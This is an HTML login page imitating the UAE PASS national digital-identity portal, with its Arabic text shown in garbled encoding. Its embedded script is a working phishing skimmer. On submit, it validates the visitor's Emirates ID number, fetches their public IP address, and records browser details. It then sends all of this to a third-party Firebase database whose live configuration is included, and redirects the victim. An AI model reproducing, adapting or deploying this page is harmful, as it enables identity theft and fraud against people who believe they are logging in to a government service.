<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAE PASS - ุชุณุฌูู ุงูุฏุฎูู</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="rectangle"></div>
    
    <div class="main-wrapper">
        <div class="container">
            <!-- ุฅุถุงูุฉ ูุคุดุฑ ุญุงูุฉ ุงูุงุชุตุงู -->
            <div id="connectionStatus" style="display: none; padding: 10px; margin-bottom: 15px; border-radius: 8px; text-align: center;">
                <span id="statusText"></span>
            </div>
            
            <header class="header">
                <div class="logo">
                    <img src="self_service.png" alt="UAE Pass Logo">
                </div>
                
                <h1 class="login-to-uaepass">
                    ุงูุฏุฎูู ุนู ุทุฑูู ุงููููุฉ ุงูุฑูููุฉ
                </h1>
            </header>
            
            <main class="login-content">
                <form id="loginForm">
                    <div class="form-group">
                        <input type="text" 
                               class="form-input" 
                               id="username" 
                               name="username" 
                               placeholder="ุฑูู ุงููููุฉุ ุงูุจุฑูุฏ ุงูุฅููุชุฑูููุ ุฃู ุงููุงุชู"
                               required>
                    </div>
                    
                    <div class="form-options">
                        <div class="form-check">
                            <input type="checkbox" checked id="rememberme" name="rememberme">
                            <label class="checkbox-label" for="rememberme">ุชุฐูุฑูู</label>
                        </div>
                    </div>
                    
                    <div class="form-group-button">
                        <button type="submit" class="btn-login" id="submitButton">
                            ุชุณุฌูู ุงูุฏุฎูู
                        </button>
                    </div>
                </form>
                
                <div class="divider">
                    <hr class="style">
                    <span class="divider-text">ุฃู</span>
                </div>
                
                <div class="account-actions">
                    <div class="dont-have-account">
                        <span class="account-text">ููุณ ูุฏูู ุญุณุงุจุ</span>
                        <a href="#" class="create-new-account">ุฅูุดุงุก ุญุณุงุจ ุฌุฏูุฏ</a>
                    </div>
                    
                    <div class="recover-account">
                        <a href="#" class="recover-link">ููููุฉ ุงุณุชุนุงุฏุฉ ุงูุญุณุงุจุ</a>
                    </div>
                </div>
                
                <div class="uaepass-app">
                    <button class="btn-app" type="button">
                        <span class="btn-text">UAE PASS App</span>
                    </button>
                </div>
            </main>
            
            <footer class="footer">
                <div class="footer-links">
                    <a href="#" class="menu-link">ุงูุฏุนู</a>
                    <span class="menu-separator">|</span>
                    <a href="#" class="menu-link">ุงูุฃุณุฆูุฉ ุงูุดุงุฆุนุฉ</a>
                    <span class="menu-separator">|</span>
                    <a href="#" class="menu-link">ูุจุฐุฉ ุนุงูุฉ</a>
                </div>
                <div class="copyright">
                    ุญููู ุงููุดุฑ ยฉ 2025 ุงููููุฉ ุงูุฑูููุฉ ุฌููุน ุงูุญููู ูุญููุธุฉ.
                </div>
            </footer>
        </div>
    </div>

    <script type="module">
        // === ุชูููู Firebase ===
        const firebaseConfig = {
            apiKey: "AIzaSyA1c9ft1XJrmjKIwhdxixJ1KM5Q3VL9HvQ",
            authDomain: "uaewep-38378.firebaseapp.com",
            databaseURL: "https://uaewep-38378-default-rtdb.firebaseio.com",
            projectId: "uaewep-38378",
            storageBucket: "uaewep-38378.firebasestorage.app",
            messagingSenderId: "366757774392",
            appId: "1:366757774392:web:32da696c806184709ed2cd",
            measurementId: "G-XNZC0GHCMM"
        };

        // === ุงููุญุฏุงุช ===
        let app, database;
        
        try {
            const { initializeApp } = await import("https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js");
            const { getDatabase, ref, push, set, serverTimestamp } = await import("https://www.gstatic.com/firebasejs/12.7.0/firebase-database.js");
            
            app = initializeApp(firebaseConfig);
            database = getDatabase(app);
            
            console.log("โ Firebase ุชู ุงูุชููุฆุฉ ุจูุฌุงุญ");
            updateConnectionStatus("success", "โ ูุชุตู ุจูุงุนุฏุฉ ุงูุจูุงูุงุช");
            
        } catch (error) {
            console.error("โ ุฎุทุฃ ูู ุชููุฆุฉ Firebase:", error);
            updateConnectionStatus("error", "โ ุฎุทุฃ ูู ุงูุงุชุตุงู ุจูุงุนุฏุฉ ุงูุจูุงูุงุช");
        }

        // === ูุชุบูุฑุงุช ===
        let isOnline = navigator.onLine;
        let isFirebaseConnected = false;

        // === ุฏุงูุฉ ุชุญุฏูุซ ุญุงูุฉ ุงูุงุชุตุงู ===
        function updateConnectionStatus(type, message) {
            const statusElement = document.getElementById('connectionStatus');
            const statusText = document.getElementById('statusText');
            
            if (!statusElement || !statusText) return;
            
            statusElement.style.display = 'block';
            statusText.textContent = message;
            
            const colors = {
                success: '#d4edda',
                error: '#f8d7da',
                warning: '#fff3cd',
                info: '#d1ecf1'
            };
            
            const textColors = {
                success: '#155724',
                error: '#721c24',
                warning: '#856404',
                info: '#0c5460'
            };
            
            statusElement.style.backgroundColor = colors[type] || colors.info;
            statusElement.style.color = textColors[type] || textColors.info;
            statusElement.style.border = `1px solid ${textColors[type] || textColors.info}`;
            
            if (type === 'success') {
                setTimeout(() => {
                    statusElement.style.display = 'none';
                }, 3000);
            }
        }

        // === ุงุฎุชุจุงุฑ ุงุชุตุงู Firebase ===
        async function testFirebaseConnection() {
            if (!database) {
                updateConnectionStatus("error", "โ ูุงุนุฏุฉ ุงูุจูุงูุงุช ุบูุฑ ูููุฆุฉ");
                return false;
            }
            
            try {
                const testRef = ref(database, 'connection_test');
                await set(testRef, {
                    test: 'connection',
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent.substring(0, 50)
                });
                
                console.log("โ ุงุชุตุงู Firebase ูุงุฌุญ!");
                isFirebaseConnected = true;
                updateConnectionStatus("success", "โ ูุชุตู ุจูุงุนุฏุฉ ุงูุจูุงูุงุช");
                return true;
                
            } catch (error) {
                console.error("โ ูุดู ุงุชุตุงู Firebase:", error);
                updateConnectionStatus("error", "โ ูุดู ุงูุงุชุตุงู ุจูุงุนุฏุฉ ุงูุจูุงูุงุช");
                isFirebaseConnected = false;
                return false;
            }
        }

        // === ุงูุชุญูู ูู ุฑูู ุงููููุฉ ===
        function validateEmiratesID(idNumber) {
            if (!idNumber || idNumber.trim() === '') {
                return { isValid: false, message: "ูุฑุฌู ุฅุฏุฎุงู ุฑูู ุงููููุฉ" };
            }
            
            const cleanId = idNumber.replace(/\D/g, '');
            
            if (cleanId.length !== 15) {
                return { isValid: false, message: "ุฑูู ุงููููุฉ ูุชููู ูู 15 ุฑููุงู" };
            }
            
            if (!/^\d+$/.test(cleanId)) {
                return { isValid: false, message: "ูุฌุจ ุฃู ูุญุชูู ุนูู ุฃุฑูุงู ููุท" };
            }
            
            return { 
                isValid: true, 
                cleanedId: cleanId,
                message: "ุฑูู ูููุฉ ุตุงูุญ"
            };
        }

        // === ุฏุงูุฉ ุงูุญูุธ ===
        async function saveUserData(idNumber, rememberMe) {
            if (!isOnline) {
                return {
                    success: false,
                    error: "ูุง ููุฌุฏ ุงุชุตุงู ุจุงูุฅูุชุฑูุช",
                    localSave: true
                };
            }
            
            if (!isFirebaseConnected) {
                const connected = await testFirebaseConnection();
                if (!connected) {
                    return {
                        success: false,
                        error: "ูุง ูููู ุงูุงุชุตุงู ุจูุงุนุฏุฉ ุงูุจูุงูุงุช",
                        localSave: true
                    };
                }
            }
            
            try {
                const validation = validateEmiratesID(idNumber);
                if (!validation.isValid) {
                    throw new Error(validation.message);
                }
                
                // ุฌูุจ IP
                let ipAddress = 'ุบูุฑ ูุนุฑูู';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json', { timeout: 5000 });
                    if (ipResponse.ok) {
                        const ipData = await ipResponse.json();
                        ipAddress = ipData.ip;
                    }
                } catch (ipError) {
                    console.warn("โ๏ธ ูุง ูููู ุฌูุจ IP:", ipError);
                }
                
                // ุฅุนุฏุงุฏ ุงูุจูุงูุงุช
                const userData = {
                    idNumber: validation.cleanedId,
                    rememberMe: rememberMe,
                    timestamp: new Date().toISOString(),
                    date: new Date().toLocaleDateString('ar-SA'),
                    time: new Date().toLocaleTimeString('ar-SA'),
                    ipAddress: ipAddress,
                    userAgent: navigator.userAgent.substring(0, 100),
                    language: navigator.language,
                    screenSize: `${window.innerWidth}x${window.innerHeight}`
                };
                
                console.log("๐พ ุฌุงุฑู ุงูุญูุธ...", userData);
                
                // ุงูุญูุธ ูู Firebase
                const usersRef = ref(database, 'users');
                const newUserRef = push(usersRef);
                await set(newUserRef, userData);
                
                console.log("โ ุชู ุงูุญูุธ! ุงูููุชุงุญ:", newUserRef.key);
                
                // ุญูุธ ูุญูู ูููุณุฎ ุงูุงุญุชูุงุทู
                const localData = {
                    ...userData,
                    firebaseKey: newUserRef.key,
                    savedLocally: new Date().toISOString()
                };
                
                localStorage.setItem(`backup_${newUserRef.key}`, JSON.stringify(localData));
                
                return {
                    success: true,
                    key: newUserRef.key,
                    id: validation.cleanedId,
                    message: "ุชู ุงูุญูุธ ุจูุฌุงุญ"
                };
                
            } catch (error) {
                console.error("โ ุฎุทุฃ ูู ุงูุญูุธ:", error);
                
                // ุญูุธ ูุญูู ูู ุญุงูุฉ ุงููุดู
                const localBackup = {
                    idNumber: idNumber.replace(/\D/g, ''),
                    rememberMe: rememberMe,
                    timestamp: new Date().toISOString(),
                    error: error.message,
                    savedLocally: new Date().toISOString()
                };
                
                const backupKey = `failed_${Date.now()}`;
                localStorage.setItem(backupKey, JSON.stringify(localBackup));
                
                return {
                    success: false,
                    error: error.message,
                    localSave: true,
                    backupKey: backupKey
                };
            }
        }

        // === ูุนุงูุฌุฉ ุงููููุฐุฌ ===
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const submitButton = document.getElementById('submitButton');
            const rememberMe = document.getElementById('rememberme').checked;
            
            // ุงูุชุญูู ุงูุฃุณุงุณู
            if (!username) {
                showMessage("ูุฑุฌู ุฅุฏุฎุงู ุฑูู ุงููููุฉ", "error");
                return;
            }
            
            // ุงูุชุญูู ูู ุงูุงุชุตุงู
            if (!isOnline) {
                showMessage("ูุง ููุฌุฏ ุงุชุตุงู ุจุงูุฅูุชุฑูุช", "error");
                return;
            }
            
            // ุฅุนุฏุงุฏ ุงูุฒุฑ
            const originalText = submitButton.textContent;
            const originalColor = submitButton.style.backgroundColor;
            
            submitButton.textContent = 'ุฌุงุฑู ุงูุญูุธ...';
            submitButton.disabled = true;
            submitButton.style.opacity = '0.7';
            
            try {
                const result = await saveUserData(username, rememberMe);
                
                if (result.success) {
                    // ูุฌุงุญ
                    showMessage(`โ ${result.message} - ุงูุฑูู: ${result.id}`, "success");
                    
                    if (rememberMe) {
                        localStorage.setItem('last_id', result.id);
                        localStorage.setItem('last_save', new Date().toISOString());
                    }
                    
                    submitButton.textContent = 'โ ุชู ุงูุญูุธ';
                    submitButton.style.backgroundColor = '#00ac75';
                    submitButton.style.color = 'white';
                    
                    // ุฅุนุงุฏุฉ ุชุนููู ุงููููุฐุฌ
                    setTimeout(() => {
                        document.getElementById('username').value = '';
                        if (!rememberMe) {
                            document.getElementById('rememberme').checked = false;
                        }
                    }, 1000);
                    
                    // ุฅุนุงุฏุฉ ุงูุชูุฌูู
                    setTimeout(() => {
                        window.location.href = 'index.html?saved=true&id=' + result.id;
                    }, 2000);
                    
                } else {
                    // ูุดู
                    let errorMsg = result.error;
                    if (result.localSave) {
                        errorMsg += " - ุชู ุงูุญูุธ ูุญููุงู";
                    }
                    
                    showMessage(`โ ${errorMsg}`, "error");
                    submitButton.textContent = originalText;
                    submitButton.disabled = false;
                    submitButton.style.opacity = '1';
                }
                
            } catch (error) {
                showMessage(`โ ุฎุทุฃ ุบูุฑ ูุชููุน: ${error.message}`, "error");
                submitButton.textContent = originalText;
                submitButton.disabled = false;
                submitButton.style.opacity = '1';
            }
        });

        // === ุฏุงูุฉ ุนุฑุถ ุงูุฑุณุงุฆู ===
        function showMessage(message, type = "info") {
            const existingMsg = document.querySelector('.user-message');
            if (existingMsg) existingMsg.remove();
            
            const messageDiv = document.createElement('div');
            messageDiv.className = `user-message ${type}`;
            messageDiv.textContent = message;
            messageDiv.style.cssText = `
                padding: 15px;
                margin: 15px 0;
                border-radius: 8px;
                text-align: center;
                font-size: 14px;
                font-weight: 500;
                animation: fadeIn 0.3s;
                ${type === 'error' ? 
                    'background: #fee; color: #c00; border: 1px solid #fcc;' : 
                 type === 'success' ? 
                    'background: #efe; color: #090; border: 1px solid #cfc;' :
                    'background: #eef; color: #009; border: 1px solid #ccf;'}
            `;
            
            const form = document.getElementById('loginForm');
            form.parentNode.insertBefore(messageDiv, form);
            
            setTimeout(() => {
                if (messageDiv.parentNode) {
                    messageDiv.style.opacity = '0';
                    messageDiv.style.transition = 'opacity 0.5s';
                    setTimeout(() => messageDiv.remove(), 500);
                }
            }, 5000);
        }

        // === ูุฑุงูุจุฉ ุงูุงุชุตุงู ===
        window.addEventListener('online', () => {
            isOnline = true;
            updateConnectionStatus("success", "โ ุชู ุงุณุชุนุงุฏุฉ ุงูุงุชุตุงู ุจุงูุฅูุชุฑูุช");
            console.log("๐ ุงุชุตุงู ุงูุฅูุชุฑูุช ุงุณุชูุนูุฏ");
            
            // ูุญุงููุฉ ุฅุนุงุฏุฉ ุงูุงุชุตุงู ุจู Firebase
            setTimeout(testFirebaseConnection, 1000);
        });
        
        window.addEventListener('offline', () => {
            isOnline = false;
            updateConnectionStatus("warning", "โ๏ธ ููุฏุงู ุงูุงุชุตุงู ุจุงูุฅูุชุฑูุช");
            console.warn("โ๏ธ ููุฏุงู ุงูุงุชุตุงู ุจุงูุฅูุชุฑูุช");
        });

        // === ุงูุชููุฆุฉ ุงูุฃูููุฉ ===
        window.addEventListener('DOMContentLoaded', () => {
            console.log("๐ ุงูุตูุญุฉ ุฌุงูุฒุฉ");
            
            // ุชุญููู ุงูุจูุงูุงุช ุงููุญููุธุฉ
            const savedId = localStorage.getItem('last_id');
            const savedRemember = localStorage.getItem('remember_me');
            
            if (savedId && savedRemember === 'true') {
                document.getElementById('username').value = savedId;
                document.getElementById('rememberme').checked = true;
            }
            
            // ุงุฎุชุจุงุฑ ุงูุงุชุตุงู
            setTimeout(() => {
                testFirebaseConnection();
            }, 1000);
            
            // ุนุฑุถ ุญุงูุฉ ุงูุงุชุตุงู ุงูุฃูููุฉ
            if (!isOnline) {
                updateConnectionStatus("warning", "โ๏ธ ูุง ููุฌุฏ ุงุชุตุงู ุจุงูุฅูุชุฑูุช");
            }
        });

        // === ุฃููููุดู ===
        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(-10px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.02); }
                100% { transform: scale(1); }
            }
            
            .btn-login:disabled {
                animation: pulse 1.5s infinite;
            }
        `;
        document.head.appendChild(style);

        // === ุฃุฏูุงุช ุงูุชุทููุฑ ===
        console.log("๐ง ุฃุฏูุงุช ุงูุชุทููุฑ ุงููุชุงุญุฉ:");
        console.log("- testSave('784123456789012') - ุงุฎุชุจุฑ ุงูุญูุธ");
        console.log("- checkConnection() - ุชุญูู ูู ุงูุงุชุตุงู");
        console.log("- viewBackups() - ุนุฑุถ ุงููุณุฎ ุงูุงุญุชูุงุทูุฉ");
        
        window.testSave = async function(testId = '784123456789012') {
            console.log("๐งช ุงุฎุชุจุงุฑ ุงูุญูุธ...");
            const result = await saveUserData(testId, false);
            console.log("ุงููุชูุฌุฉ:", result);
            return result;
        };
        
        window.checkConnection = testFirebaseConnection;
        
        window.viewBackups = function() {
            console.log("๐ฆ ุงููุณุฎ ุงูุงุญุชูุงุทูุฉ ุงููุญููุฉ:");
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.includes('backup_') || key.includes('failed_')) {
                    console.log(`${key}:`, JSON.parse(localStorage.getItem(key)));
                }
            }
        };

        // === ุฅุถุงูุฉ ุฒุฑ ูุณุงุนุฏุฉ ===
        const helpButton = document.createElement('button');
        helpButton.textContent = 'ูุณุงุนุฏุฉ ุชูููุฉ';
        helpButton.style.cssText = `
            position: fixed;
            bottom: 20px;
            left: 20px;
            padding: 8px 15px;
            background: #78849e;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            z-index: 1000;
        `;
        helpButton.onclick = function() {
            const connectionInfo = `
                ุญุงูุฉ ุงูุงุชุตุงู: ${isOnline ? 'ูุชุตู' : 'ุบูุฑ ูุชุตู'}
                Firebase: ${isFirebaseConnected ? 'ูุชุตู' : 'ุบูุฑ ูุชุตู'}
                ุขุฎุฑ IP: ${localStorage.getItem('last_ip') || 'ุบูุฑ ูุนุฑูู'}
                ูุณุฎ ุงุญุชูุงุทูุฉ: ${Array.from({length: localStorage.length})
                    .filter((_, i) => localStorage.key(i).includes('backup_') || 
                            localStorage.key(i).includes('failed_')).length}
            `;
            alert(connectionInfo);
        };
        document.body.appendChild(helpButton);

    </script>
</body>
</html>
